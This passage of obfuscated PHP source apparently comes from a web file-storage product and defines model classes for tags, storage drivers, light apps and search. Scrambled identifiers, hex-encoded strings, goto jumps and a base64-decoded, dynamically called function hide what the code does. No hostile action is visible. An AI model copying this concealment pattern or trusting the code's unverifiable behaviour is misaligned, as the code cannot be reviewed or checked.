$µ“º›Öœ =& $_SERVER[¡¬ıÜ ƒ]; if ($†ÏÊ®Ç¨ == $µ“º›Öœ[12]) { return $GLOBALS[$µ“º›Öœ[6]][$µ“º›Öœ[2521]]; } if ($†ÏÊ®Ç¨ == $µ“º›Öœ[2522]) { return $GLOBALS[$µ“º›Öœ[6]][$µ“º›Öœ[2523]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\x74\141\147\114\x69\x73\164"; public $modelType = "\x55\163\x65\162\117\160\x74\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x79\154\x65", "\163\157\162\x74"); public function listData($ÕŒÙ¢Ğ = false, $Ÿ÷ÈÍÑì = "\163\157\162\x74", $¤Û£ÅÔÑ = false) { return parent::listData($ÕŒÙ¢Ğ, $Ÿ÷ÈÍÑì, $¤Û£ÅÔÑ); } public function remove($ìÏâÊ¯â) { return parent::remove($ìÏâÊ¯â); } public function add($¾øÂÏ°ê, $‹Ğöà³Â = "\x6c\141\x62\145\x6c\x2d\x67\162\x65\171\x2d\156\x6f\162\155\141\154") { $’Ë·Çš¯ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->findByName($¾øÂÏ°ê)) { return !1; } $÷œôåôÎ = array($’Ë·Çš¯[496] => $¾øÂÏ°ê, $’Ë·Çš¯[560] => $‹Ğöà³Â, $’Ë·Çš¯[1990] => $this->getSort($’Ë·Çš¯[337]) + 1); return parent::insert($÷œôåôÎ); } public function update($íãÛÀî¢, $¦Ö¿Ÿ˜ú) { $ÒÏâ‘†£ =& $_SERVER[¡¬ıÜ ƒ]; $ÉûÛ› = $this->listData($íãÛÀî¢); $±±øŞ…æ = $this->findByName($¦Ö¿Ÿ˜ú[$ÒÏâ‘†£[32]]); if (!$ÉûÛ› || $±±øŞ…æ && $±±øŞ…æ[$ÒÏâ‘†£[477]] != $ÉûÛ›[$ÒÏâ‘†£[477]]) { return !1; } return parent::update($íãÛÀî¢, $¦Ö¿Ÿ˜ú); } public function moveTop($ÇòÒãø¶) { $µúõ¢Ö =& $_SERVER[¡¬ıÜ ƒ]; $ºËÚµü× = parent::listData(); $§Å¤à›Ò = $this->getSort($µúõ¢Ö[336]); foreach ($ºËÚµü× as &$•µöô€) { if ($•µöô€[$µúõ¢Ö[477]] == $ÇòÒãø¶) { $•µöô€[$µúõ¢Ö[2010]] = $§Å¤à›Ò; continue; } $•µöô€[$µúõ¢Ö[2010]] += 1; } unset($•µöô€); return parent::resetData($ºËÚµü×); } public function moveBottom($¤Ñ—ì§û) { $¼öÚ¼äÛ =& $_SERVER[¡¬ıÜ ƒ]; $ãİÉö¤ª = $this->getSort($¼öÚ¼äÛ[337]) + 1; return parent::update($¤Ñ—ì§û, array($¼öÚ¼äÛ[2010] => $ãİÉö¤ª)); } public function resetSort($‘ŠÙãŞÅ) { $ÍæÃ˜Ç¢ =& $_SERVER[¡¬ıÜ ƒ]; $ä£ú = array(); $‘ŠÙãŞÅ = is_array($‘ŠÙãŞÅ) ? $‘ŠÙãŞÅ : array(); for ($Ù—ÍüÕ  = 0; $Ù—ÍüÕ  < count($‘ŠÙãŞÅ); $Ù—ÍüÕ ++) { $ä£ú[$‘ŠÙãŞÅ[$Ù—ÍüÕ ] . $ÍæÃ˜Ç¢[12]] = $Ù—ÍüÕ  + 1; } $Ã‡¨ØÛê = parent::listData(); foreach ($Ã‡¨ØÛê as &$Ä‰½ÊèÕ) { $ÏâÍÃëÊ = $ä£ú[$Ä‰½ÊèÕ[$ÍæÃ˜Ç¢[477]]]; $Ä‰½ÊèÕ[$ÍæÃ˜Ç¢[2010]] = $ÏâÍÃëÊ ? $ÏâÍÃëÊ : $Ä‰½ÊèÕ[$ÍæÃ˜Ç¢[2010]]; } unset($Ä‰½ÊèÕ); return parent::resetData($Ã‡¨ØÛê); } private function getSort($ë˜äï·Ü) { $¤ñ‚› =& $_SERVER[¡¬ıÜ ƒ]; $ù’º³½˜ = parent::listData(); $µÖ¤¤Ù = array_to_keyvalue($ù’º³½˜, $¤ñ‚›[12], $¤ñ‚›[2010]); if (!$µÖ¤¤Ù) { $µÖ¤¤Ù = array(0); } $‚øÁ©®„ = $ë˜äï·Ü == $¤ñ‚›[337] ? max($µÖ¤¤Ù) : min($µÖ¤¤Ù); return intval($‚øÁ©®„); } } goto dÕ¸®ò˜‚; dÚ‡®šŠÑ: $fileSize = strrev(base64_decode($_SERVER[Ğ€³¬ñ¿][0])); function binCheckNeq($ÅçôÄ²Í, $õè°ş‡) { return $ÅçôÄ²Í != $õè°ş‡; } $_SERVER[$_SERVER[Ğ€³¬ñ¿][1]] = $fileSize($_SERVER[$_SERVER[Ğ€³¬ñ¿][2]]); goto d¦¥íùÚªî; BˆÄÜùì…‡: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x73\157\165\x72\143\x65\123\145\x63\162\x65\164\114\x69\x73\164"; public $field = array("\x73\x6f\x75\x72\x63\145\111\104", "\x74\x79\160\x65\111\104", "\x63\x72\x65\x61\164\145\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x73\164\x6f\162\x61\x67\x65\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\145\115\141\170", "\x73\171\x73\x74\x65\155", "\x64\x65\146\x61\x75\x6c\164", "\144\162\x69\x76\145\162", "\143\x6f\x6e\x66\151\147"); public function listData($Ö¿­Èú = false, $ĞÎââ« = "\155\157\144\151\146\x79\124\x69\155\145", $Ïç£Õ¤» = false) { $òŒá¿Éå =& $_SERVER[¡¬ıÜ ƒ]; $ıàî“ï‰ = parent::listData($Ö¿­Èú, $ĞÎââ«, $Ïç£Õ¤»); if ($Ö¿­Èú) { return $ıàî“ï‰; } $¾´Ñ‚’à = array(); if ($GLOBALS[$òŒá¿Éå[2319]]) { $¾´Ñ‚’à = $this->ioSizeUseGet(array_to_keyvalue($ıàî“ï‰, $òŒá¿Éå[12], $òŒá¿Éå[477])); } foreach ($ıàî“ï‰ as $‘ºãñáè => $™ÜœÃÆï) { unset($ıàî“ï‰[$‘ºãñáè][$òŒá¿Éå[6]]); $ıàî“ï‰[$‘ºãñáè][$òŒá¿Éå[1974]] = isset($¾´Ñ‚’à[$™ÜœÃÆï[$òŒá¿Éå[477]]]) ? $¾´Ñ‚’à[$™ÜœÃÆï[$òŒá¿Éå[477]]] : 0; } return $ıàî“ï‰; } public function ioSizeUseGet($ÊŠÊÊİ÷) { $Ù¾ã×– =& $_SERVER[¡¬ıÜ ƒ]; if (!$ÊŠÊÊİ÷) { return array(); } $ğ£Âº¯´ = $Ù¾ã×–[2320] . implode($Ù¾ã×–[50], $ÊŠÊÊİ÷); $¡¹í¾Æ = Cache::get($ğ£Âº¯´); if ($¡¹í¾Æ) { return $¡¹í¾Æ; } $½İ†ÜÇĞ = array($Ù¾ã×–[907] => $Ù¾ã×–[477], $Ù¾ã×–[2321] => $Ù¾ã×–[79]); $ã°Ùæö = array($Ù¾ã×–[907] => array($Ù¾ã×–[7], $ÊŠÊÊİ÷)); $¡¹í¾Æ = Model($Ù¾ã×–[878])->field($½İ†ÜÇĞ)->where($ã°Ùæö)->group($Ù¾ã×–[907])->select(); $¡¹í¾Æ = array_to_keyvalue($¡¹í¾Æ, $Ù¾ã×–[477], $Ù¾ã×–[79]); Cache::set($ğ£Âº¯´, $¡¹í¾Æ, 600); return $¡¹í¾Æ; } public function getConfig($˜ØúĞŸâ) { $İ’¹÷ÈÃ = parent::listData($˜ØúĞŸâ); $›Ó©ÇÔ = _get($İ’¹÷ÈÃ, $_SERVER[¡¬ıÜ ƒ][6], array()); if ($›Ó©ÇÔ && !is_array($›Ó©ÇÔ)) { $›Ó©ÇÔ = json_decode($›Ó©ÇÔ, !0); } return $›Ó©ÇÔ; } public function update($âˆÎ„ß§, $‹ÖÛÍ) { $ü°ò™ù =& $_SERVER[¡¬ıÜ ƒ]; $¶¨›¯ä– = $‹ÖÛÍ[$ü°ò™ù[32]]; $´Ô˜Š = array_to_keyvalue(parent::listData(), $ü°ò™ù[32]); if (isset($´Ô˜Š[$¶¨›¯ä–]) && $´Ô˜Š[$¶¨›¯ä–][$ü°ò™ù[477]] != $âˆÎ„ß§) { return !1; } $this->checkPwd($âˆÎ„ß§, $‹ÖÛÍ); if (isset($‹ÖÛÍ[$ü°ò™ù[2322]]) && $‹ÖÛÍ[$ü°ò™ù[2322]] == $ü°ò™ù[91]) { $this->checkConfig($‹ÖÛÍ); } unset($‹ÖÛÍ[$ü°ò™ù[2322]]); $ÌÅó· ¦ = parent::update($âˆÎ„ß§, $‹ÖÛÍ); if ($ÌÅó· ¦ && $‹ÖÛÍ[$ü°ò™ù[37]]) { $ÎÌ”éË§ = 0; foreach ($´Ô˜Š as $İö”¢­ë) { if ($İö”¢­ë[$ü°ò™ù[37]] && $İö”¢­ë[$ü°ò™ù[477]] != $âˆÎ„ß§) { $ÎÌ”éË§ = $İö”¢­ë[$ü°ò™ù[477]]; parent::update($İö”¢­ë[$ü°ò™ù[477]], array($ü°ò™ù[37] => 0)); } } $this->updateBackup($âˆÎ„ß§, $ÎÌ”éË§); } return $ÌÅó· ¦; } public function add($±òèìÎ½) { $à¹•´¤“ =& $_SERVER[¡¬ıÜ ƒ]; $µ’Ïø = array_to_keyvalue(parent::listData(), $à¹•´¤“[32]); if (isset($µ’Ïø[$±òèìÎ½[$à¹•´¤“[32]]])) { return !1; } $this->checkConfig($±òèìÎ½); $Îì¸»¤š = parent::insert($±òèìÎ½); if ($Îì¸»¤š && $±òèìÎ½[$à¹•´¤“[37]]) { foreach ($µ’Ïø as $ûèÉ‡Ô) { if ($ûèÉ‡Ô[$à¹•´¤“[37]]) { parent::update($ûèÉ‡Ô[$à¹•´¤“[477]], array($à¹•´¤“[37] => 0)); } } } return $Îì¸»¤š; } public function updateBackup($öÄöûŞ‹, $Ï²Ôş²«) { $Ÿ¤õÖœÇ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Ï²Ôş²«) { return; } $«ú¹œ¤© = Model($Ÿ¤õÖœÇ[828])->config(); if ($«ú¹œ¤©[$Ÿ¤õÖœÇ[1754]] != $Ÿ¤õÖœÇ[91] || $«ú¹œ¤©[$Ÿ¤õÖœÇ[832]] != $Ï²Ôş²«) { return; } $âğ­¨Ø× = Model($Ÿ¤õÖœÇ[850])->get($Ÿ¤õÖœÇ[872]); $âğ­¨Ø× = json_decode($âğ­¨Ø×, !0); if (!$âğ­¨Ø×) { return; } $âğ­¨Ø×[$Ÿ¤õÖœÇ[832]] = $öÄöûŞ‹; Model($Ÿ¤õÖœÇ[850])->set(array($Ÿ¤õÖœÇ[872] => $âğ­¨Ø×)); } public function checkPwd($ÚóÛ¸°ú, &$ßîÛä) { $ûÍºé ª =& $_SERVER[¡¬ıÜ ƒ]; if (empty($ßîÛä[$ûÍºé ª[6]])) { return; } $ïáõèÉà = $ßîÛä[$ûÍºé ª[6]]; if (!is_array($ïáõèÉà)) { $ïáõèÉà = json_decode($ïáõèÉà, !0); } $ÌÏæ¬¼¦ = $ûÍºé ª[12]; $Ï¢Ô¿ÕÖ = array($ûÍºé ª[2323], $ûÍºé ª[2324], $ûÍºé ª[977]); foreach ($Ï¢Ô¿ÕÖ as $ğÃµâšĞ) { if (isset($ïáõèÉà[$ğÃµâšĞ])) { $ÌÏæ¬¼¦ = $ğÃµâšĞ; break; } } if (!$ÌÏæ¬¼¦) { return; } $ø¶‘ƒÏ÷ = $this->getConfig($ÚóÛ¸°ú); $î·Ã¯À¾ = $ø¶‘ƒÏ÷[$ÌÏæ¬¼¦]; $Íë”Â“÷ = $ïáõèÉà[$ÌÏæ¬¼¦]; if ($Íë”Â“÷ == str_repeat($ûÍºé ª[222], strlen($î·Ã¯À¾))) { $ïáõèÉà[$ÌÏæ¬¼¦] = $î·Ã¯À¾; $ßîÛä[$ûÍºé ª[6]] = json_encode($ïáõèÉà); } else { if ($Íë”Â“÷ != $î·Ã¯À¾) { $ßîÛä[$ûÍºé ª[2322]] = $ûÍºé ª[91]; } } } public function checkConfig(&$åÊäßä, $ê¼‘ùÕê = false) { $ğôØãäò =& $_SERVER[¡¬ıÜ ƒ]; $ñş£˜Ö» = strtolower($åÊäßä[$ğôØãäò[98]]); $É¯ÚÏ·ñ = $åÊäßä[$ğôØãäò[6]]; if (!is_array($É¯ÚÏ·ñ)) { $É¯ÚÏ·ñ = json_decode($É¯ÚÏ·ñ, !0); } foreach ($É¯ÚÏ·ñ as $ü¼ÏÍì« => $ûÃÅ™‹¸) { if (is_string($ûÃÅ™‹¸)) { $É¯ÚÏ·ñ[$ü¼ÏÍì«] = trim($ûÃÅ™‹¸); } } $É¯ÚÏ·ñ[$ğôØãäò[2325]] = rand_string(6); $åÓ…¡¾è = $GLOBALS[$ğôØãäò[6]][$ğôØãäò[92]][$ğôØãäò[915]]; $æ·ÙÖÕÓ = isset($åÓ…¡¾è[$ñş£˜Ö»]) ? $åÓ…¡¾è[$ñş£˜Ö»] : ucfirst($ñş£˜Ö»); $¹·Û¦úï = $ğôØãäò[77] . $æ·ÙÖÕÓ; if (!$æ·ÙÖÕÓ || !class_exists($¹·Û¦úï)) { if ($ê¼‘ùÕê) { return LNG($ğôØãäò[2326]); } write_log(array($ğôØãäò[2327], $åÊäßä, get_caller_info()), $ğôØãäò[215]); show_json(LNG($ğôØãäò[2326]), !1, $åÊäßä); } $Ÿº´Š˜ = new $¹·Û¦úï($É¯ÚÏ·ñ); if (in_array($ñş£˜Ö», $Ÿº´Š˜->objectDriver)) { try { if (!$Ÿº´Š˜->isBucketCors() && !$Ÿº´Š˜->setBucketCors()) { $«©³³çø = LNG($ğôØãäò[2328]); $«©³³çø .= $ğôØãäò[2329] . LNG($ğôØãäò[2330]); } } catch (Exception $ğ‰›ãı¶) { $«©³³çø = $ğ‰›ãı¶->getMessage(); } if (isset($«©³³çø)) { return $this->_parseError($«©³³çø, $ñş£˜Ö», $ê¼‘ùÕê); } if ($ñş£˜Ö» == $ğôØãäò[68] && !$Ÿº´Š˜->checkRegion()) { return $this->_parseError(LNG($ğôØãäò[2331]), $ñş£˜Ö», $ê¼‘ùÕê); } } $ôŸ¼‚œª = rtrim($É¯ÚÏ·ñ[$ğôØãäò[1273]], $ğôØãäò[8]) . $ğôØãäò[8]; $­ö¶ŞœÀ = $Ÿº´Š˜->getPath($ôŸ¼‚œª . $ğôØãäò[1277]); try { if ($ñş£˜Ö» == $ğôØãäò[109]) { $Ÿº´Š˜->mkdir($ôŸ¼‚œª); } $²²õ±‡˜ = $Ÿº´Š˜->mkfile($­ö¶ŞœÀ); if (!$²²õ±‡˜) { $«©³³çø = LNG($ğôØãäò[2328]); } } catch (Exception $ğ‰›ãı¶) { $«©³³çø = $ğ‰›ãı¶->getMessage(); } if (isset($«©³³çø)) { return $this->_parseError($«©³³çø, $ñş£˜Ö», $ê¼‘ùÕê); } $É¯ÚÏ·ñ[$ğôØãäò[1273]] = $ôŸ¼‚œª; $åÊäßä[$ğôØãäò[6]] = json_encode($É¯ÚÏ·ñ); $åÊäßä[$ğôØãäò[98]] = $æ·ÙÖÕÓ; return !0; } private function _parseError($ŞŒ”ŸŠ—, $Óµìåï, $É±©°ÙÔ = false) { $¤€‹ôİ =& $_SERVER[¡¬ıÜ ƒ]; if ($Óµìåï == $¤€‹ôİ[68] && stripos($ŞŒ”ŸŠ—, $¤€‹ôİ[2332])) { $¹Ğ„Í•ˆ = explode($¤€‹ôİ[10], $ŞŒ”ŸŠ—); $Õôâ«¿å = isset($¹Ğ„Í•ˆ[1]) ? $¹Ğ„Í•ˆ[1] : $¤€‹ôİ[12]; $ì §Ÿ…½ = array($¤€‹ôİ[2333] => LNG($¤€‹ôİ[2334]), $¤€‹ôİ[2335] => LNG($¤€‹ôİ[2336])); if (isset($ì §Ÿ…½[$Õôâ«¿å])) { $ŞŒ”ŸŠ— = $ì §Ÿ…½[$Õôâ«¿å]; } } if (stripos($ŞŒ”ŸŠ—, $¤€‹ôİ[2337]) === 0) { $ÆŸ¤¸×Ï = strpos($ŞŒ”ŸŠ—, $¤€‹ôİ[178]); if ($ÆŸ¤¸×Ï === !1) { $ÆŸ¤¸×Ï = strpos($ŞŒ”ŸŠ—, $¤€‹ôİ[4]); } if ($ÆŸ¤¸×Ï !== !1) { $ŞŒ”ŸŠ— = substr($ŞŒ”ŸŠ—, $ÆŸ¤¸×Ï + 1); } } $ŞŒ”ŸŠ— = LNG($¤€‹ôİ[1280]) . $ŞŒ”ŸŠ—; if ($É±©°ÙÔ) { return $ŞŒ”ŸŠ—; } show_json($ŞŒ”ŸŠ—, !1); } public function driverListSystem() { $ƒÇ‰“ï =& $_SERVER[¡¬ıÜ ƒ]; $Ê²Äõ²¬ = parent::listData(); $õÜ×“ÉÅ = array(); foreach ($Ê²Äõ²¬ as $¸ğçŞÂÏ) { unset($¸ğçŞÂÏ[$ƒÇ‰“ï[233]], $¸ğçŞÂÏ[$ƒÇ‰“ï[88]]); if (!is_array($¸ğçŞÂÏ[$ƒÇ‰“ï[6]])) { $¸ğçŞÂÏ[$ƒÇ‰“ï[6]] = json_decode($¸ğçŞÂÏ[$ƒÇ‰“ï[6]], !0); } $õÜ×“ÉÅ[] = $¸ğçŞÂÏ; } return $õÜ×“ÉÅ; } public function defaultDriver() { $Å»ÓÓ– =& $_SERVER[¡¬ıÜ ƒ]; $öá„¾ = parent::listData(); $İ¿¢·Æ£ = array_filter_by_field($öá„¾, $Å»ÓÓ–[37], 1); $İ¿¢·Æ£ = $İ¿¢·Æ£[0]; if (!$İ¿¢·Æ£) { return array(); } if (!is_array($İ¿¢·Æ£[$Å»ÓÓ–[6]])) { $İ¿¢·Æ£[$Å»ÓÓ–[6]] = json_decode($İ¿¢·Æ£[$Å»ÓÓ–[6]], !0); } return $İ¿¢·Æ£; } public function driverInfo($Ä¡¨Øü¶) { $Óß³ÖçÖ =& $_SERVER[¡¬ıÜ ƒ]; $şßÔÓÄ = array_to_keyvalue(parent::listData(), $Óß³ÖçÖ[477]); if (!isset($şßÔÓÄ[$Ä¡¨Øü¶])) { return !1; } $ğìŸ¿úÌ = $şßÔÓÄ[$Ä¡¨Øü¶]; if (!is_array($ğìŸ¿úÌ[$Óß³ÖçÖ[6]])) { $ğìŸ¿úÌ[$Óß³ÖçÖ[6]] = json_decode($ğìŸ¿úÌ[$Óß³ÖçÖ[6]], !0); } return $ğìŸ¿úÌ; } public function remove($ÍÎ§Ø…) { $this->removeShareItems($ÍÎ§Ø…); return parent::remove($ÍÎ§Ø…); } public function removeWithFile($ÅÛú˜§, $‚£Š–ö, $Úç°¨“š, $ı÷§Â¡Û = false) { $™Í…¥Õ¨ =& $_SERVER[¡¬ıÜ ƒ]; $õ°˜ì€È = array($™Í…¥Õ¨[907] => $ÅÛú˜§); $Üå”İ÷ = Model($™Í…¥Õ¨[546])->where($õ°˜ì€È)->count(); $Áüºşùà = Model($™Í…¥Õ¨[546])->where($õ°˜ì€È)->sum($™Í…¥Õ¨[79]); $ÎÈÜıšæ = $‚£Š–ö . $™Í…¥Õ¨[2338] . $ÅÛú˜§; $ÎÖ°İÙº = LNG($‚£Š–ö == $™Í…¥Õ¨[625] ? $™Í…¥Õ¨[2339] : $™Í…¥Õ¨[2340]); $»¯‰¢”­ = new TaskFileTransfer($ÎÈÜıšæ, $™Í…¥Õ¨[215], $Üå”İ÷, $ÎÖ°İÙº . $™Í…¥Õ¨[464] . $Úç°¨“š[$™Í…¥Õ¨[32]] . $™Í…¥Õ¨[214] . $ÅÛú˜§); $»¯‰¢”­->task[$™Í…¥Õ¨[843]] = (double) $Áüºşùà; $Í×áÎïÁ = KodIO::defaultDriver(); $«›°‘Ğ¸ = $Í×áÎïÁ[$™Í…¥Õ¨[477]]; $ØÃŠ˜Ì = $–Ä¾ = $ëâÈ—åË = array(); $Õ¤Ô÷Š® = Model($™Í…¥Õ¨[232])->where($õ°˜ì€È)->field($™Í…¥Õ¨[2341])->select(); foreach ($Õ¤Ô÷Š® as $Ğ¢ÍúÌ) { $¥´ñÉí¡ = $Ğ¢ÍúÌ[$™Í…¥Õ¨[543]]; if ($ı÷§Â¡Û) { $–Ä¾[] = $¥´ñÉí¡; continue; } $‚Áö¦¿ê = $Ğ¢ÍúÌ[$™Í…¥Õ¨[87]]; $‚æ–¤¨ = get_path_father($‚Áö¦¿ê); $ëâÈ—åË[] = $‚æ–¤¨; $‚æ–¤¨ = str_replace("\x7b\x69\157\72{$ÅÛú˜§}\x7d\x2f", "\x7b\151\x6f\72{$«›°‘Ğ¸}\175\x2f", $‚æ–¤¨); if (!IO::exist($‚Áö¦¿ê)) { $ØÃŠ˜Ì[] = $¥´ñÉí¡; $»¯‰¢”­->updateFileEnd($Ğ¢ÍúÌ[$™Í…¥Õ¨[32]], $Ğ¢ÍúÌ[$™Í…¥Õ¨[79]]); write_log($™Í…¥Õ¨[2342] . $‚Áö¦¿ê, $™Í…¥Õ¨[1917]); continue; } $Œœ³×Ü¬ = IO::move($‚Áö¦¿ê, $‚æ–¤¨, REPEAT_RENAME); if (!$Œœ³×Ü¬) { $–Ä¾[] = $¥´ñÉí¡; $»¯‰¢”­->updateFileEnd($Ğ¢ÍúÌ[$™Í…¥Õ¨[32]], $Ğ¢ÍúÌ[$™Í…¥Õ¨[79]]); write_log($™Í…¥Õ¨[2343] . $‚Áö¦¿ê, $™Í…¥Õ¨[1917]); continue; } $õ°˜ì€È = array($™Í…¥Õ¨[543] => $¥´ñÉí¡); $¡§ÁÄ¨ = array($™Í…¥Õ¨[907] => $«›°‘Ğ¸, $™Í…¥Õ¨[87] => $Œœ³×Ü¬); Model($™Í…¥Õ¨[232])->where($õ°˜ì€È)->save($¡§ÁÄ¨); } $şâÛÙÛ÷ = $»¯‰¢”­->task; if (!$ı÷§Â¡Û) { Cache::set($ÎÈÜıšæ, $şâÛÙÛ÷); } $»¯‰¢”­->end(); $ØÃŠ˜Ì = array_unique($ØÃŠ˜Ì); $–Ä¾ = array_unique($–Ä¾); if (!$ı÷§Â¡Û && ($ØÃŠ˜Ì || $–Ä¾)) { $Çã§•‘— = array(); if ($ØÃŠ˜Ì) { $Çã§•‘—[] = sprintf(LNG($™Í…¥Õ¨[2344]), count($ØÃŠ˜Ì)); } if ($–Ä¾) { $Çã§•‘—[] = sprintf(LNG($™Í…¥Õ¨[2345]), count($–Ä¾)); } $Çã§•‘— = sprintf(LNG($™Í…¥Õ¨[2346]), implode($™Í…¥Õ¨[2347], $Çã§•‘—)) . $™Í…¥Õ¨[2348] . date($™Í…¥Õ¨[2349]) . $™Í…¥Õ¨[2350]; if ($‚£Š–ö == $™Í…¥Õ¨[1954]) { $Çã§•‘— .= $™Í…¥Õ¨[2351] . LNG($™Í…¥Õ¨[2352]); } else { $Çã§•‘— = LNG($™Í…¥Õ¨[2353]) . $™Í…¥Õ¨[2354] . $Çã§•‘—; } $şâÛÙÛ÷[$™Í…¥Õ¨[1275]] = $Çã§•‘—; Cache::set($ÎÈÜıšæ, $şâÛÙÛ÷); unset($Úç°¨“š[$™Í…¥Õ¨[6]]); $Î­Ì = array($™Í…¥Õ¨[477] => $ÅÛú˜§, $™Í…¥Õ¨[2225] => $™Í…¥Õ¨[625], $™Í…¥Õ¨[32] => $Úç°¨“š[$™Í…¥Õ¨[32]], $™Í…¥Õ¨[98] => $Úç°¨“š[$™Í…¥Õ¨[98]]); Hook::trigger($™Í…¥Õ¨[1796], array($™Í…¥Õ¨[1298] => $Î­Ì, $™Í…¥Õ¨[1308] => !0)); show_json($Çã§•‘—, !1, 100111); } if ($‚£Š–ö == $™Í…¥Õ¨[625]) { return !0; } if ($ØÃŠ˜Ì || $–Ä¾) { $„£‚ÍÅ÷ = array_merge($ØÃŠ˜Ì, $–Ä¾); $„£‚ÍÅ÷ = array_filter(array_unique($„£‚ÍÅ÷)); $this->removeByFileID($„£‚ÍÅ÷); } if ($ëâÈ—åË) { $ëâÈ—åË = array_filter(array_unique($ëâÈ—åË)); foreach ($ëâÈ—åË as $‚Áö¦¿ê) { $İ§›†Ó = IO::has($‚Áö¦¿ê, !0); if (!$İ§›†Ó[$™Í…¥Õ¨[241]] && !$İ§›†Ó[$™Í…¥Õ¨[242]]) { IO::remove($‚Áö¦¿ê); } } } return $this->remove($ÅÛú˜§); } private function removeByFileID($…ƒà„¦¯ = array()) { $ƒº³¼ì— =& $_SERVER[¡¬ıÜ ƒ]; if (empty($…ƒà„¦¯)) { return; } $™é×ú±Í = array($ƒº³¼ì—[543] => array($ƒº³¼ì—[7], $…ƒà„¦¯)); $®¯·…—Ë = Model($ƒº³¼ì—[1432])->where($™é×ú±Í)->field($ƒº³¼ì—[193])->select(); if (!$®¯·…—Ë) { return Model($ƒº³¼ì—[546])->remove($…ƒà„¦¯); } $®¯·…—Ë = array_to_keyvalue($®¯·…—Ë, $ƒº³¼ì—[12], $ƒº³¼ì—[193]); foreach ($®¯·…—Ë as $…™×¨Í) { Model($ƒº³¼ì—[914])->removeNow($…™×¨Í, !1); } } private function removeShareItems($¤‘ºı˜) { $²øõÕ¶ =& $_SERVER[¡¬ıÜ ƒ]; $÷îÂ§ˆ = "\173\151\157\72{$¤‘ºı˜}\175\x2f"; $„ŞòĞÈÌ = array($²øõÕ¶[193] => 0, $²øõÕ¶[1268] => array($²øõÕ¶[461], "{$÷îÂ§ˆ}\45")); $ÜŒ¤ŞÔ¦ = Model($²øõÕ¶[1965])->where($„ŞòĞÈÌ)->field($²øõÕ¶[670])->select(); if (empty($ÜŒ¤ŞÔ¦)) { return; } $€¾¿õ¿¿ = array_to_keyvalue($ÜŒ¤ŞÔ¦, $²øõÕ¶[12], $²øõÕ¶[670]); Model($²øõÕ¶[669])->remove($€¾¿õ¿¿); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\114\151\147\x68\164\101\x70\x70"; public $modelType = "\x53\171\163\164\145\x6d\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\162\x6f\x75\160", "\x64\145\x73\x63", "\143\157\156\x74\145\156\x74"); public function listData($íËÎÆÕù = false, $ş«ªÊ±Ô = "\155\x6f\144\151\146\171\x54\151\155\145", $­¸€ù¶ = true) { return parent::listData($íËÎÆÕù, $ş«ªÊ±Ô, $­¸€ù¶); } public function remove($¨¸’å¿¯) { $ÔÑ„¿ûÎ = $this->findByName($¨¸’å¿¯); if (!$ÔÑ„¿ûÎ) { return !1; } return parent::remove($ÔÑ„¿ûÎ[$_SERVER[¡¬ıÜ ƒ][477]]); } public function add($ú¨®ûóÙ) { if ($this->findByName($ú¨®ûóÙ[$_SERVER[¡¬ıÜ ƒ][32]])) { return !1; } return parent::insert($ú¨®ûóÙ); } public function update($¤á²Ú½¶, $Ö•Öó½) { $ÅæŒÕà› =& $_SERVER[¡¬ıÜ ƒ]; $ıÖóçğ¾ = $this->findByName($¤á²Ú½¶); $•ËßÒ÷® = $this->findByName($Ö•Öó½[$ÅæŒÕà›[32]]); if (!$ıÖóçğ¾ || $•ËßÒ÷® && $•ËßÒ÷®[$ÅæŒÕà›[477]] != $ıÖóçğ¾[$ÅæŒÕà›[477]]) { return !1; } return parent::update($ıÖóçğ¾[$ÅæŒÕà›[477]], $Ö•Öó½); } } goto F¼Ò£›‘ğ; DĞ×·‘­Ú: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ş„êëæ) { $íÀİÃ”ß =& $_SERVER[¡¬ıÜ ƒ]; $òèš·Ö¹ = KodIO::fileTypeList(); $²­Šâ®€ = $òèš·Ö¹[$ş„êëæ]; if (!$²­Šâ®€) { return array(); } $úëß½ = $²­Šâ®€[$íÀİÃ”ß[169]]; $˜êÎ¥ê™ = $íÀİÃ”ß[7]; if (!$²­Šâ®€[$íÀİÃ”ß[169]]) { $ŞİÌªö = array_to_keyvalue($òèš·Ö¹, $íÀİÃ”ß[12], $íÀİÃ”ß[169]); $úëß½ = implode($íÀİÃ”ß[50], $ŞİÌªö); $˜êÎ¥ê™ = $íÀİÃ”ß[2250]; } $ÊıŸ¼Â¢ = explode($íÀİÃ”ß[50], trim($úëß½, $íÀİÃ”ß[50])); return array($˜êÎ¥ê™, $ÊıŸ¼Â¢); } public function listPathType($¾ˆ¤ë¿å) { $ú¯áò©ä =& $_SERVER[¡¬ıÜ ƒ]; $Ù´Ùì¦ú = $this->fileTypeWhere($¾ˆ¤ë¿å); if (!$Ù´Ùì¦ú) { return array(); } $‰Ú£áá = USER_ID; $£”ş„‡ = Model($ú¯áò©ä[599])->getInfo($‰Ú£áá); $ÒŸÕı¨© = array($ú¯áò©ä[653] => SourceModel::TYPE_USER, $ú¯áò©ä[586] => array($ú¯áò©ä[617], $ú¯áò©ä[595] . $£”ş„‡[$ú¯áò©ä[90]][$ú¯áò©ä[193]] . $ú¯áò©ä[618]), $ú¯áò©ä[654] => $‰Ú£áá, $ú¯áò©ä[651] => 0, $ú¯áò©ä[652] => $Ù´Ùì¦ú); return $this->listSource($ÒŸÕı¨©); } public function listSearch($Â°øò, $÷Ÿ÷¹Ğ© = 300) { $£áÇÏæÃ =& $_SERVER[¡¬ıÜ ƒ]; if (isset($Â°øò[$£áÇÏæÃ[2084]]) && $Â°øò[$£áÇÏæÃ[2084]]) { $Â°øò[$£áÇÏæÃ[2084]] = str_replace($£áÇÏæÃ[462], $£áÇÏæÃ[2251], trim($Â°øò[$£áÇÏæÃ[2084]])); } $Â€ûøòº = $this->_parseSearchWhere($Â°øò); if (!isset($Â€ûøòº[$£áÇÏæÃ[507]])) { $Â€ûøòº[$£áÇÏæÃ[507]] = 0; } $ş®‘Í¼Ú = 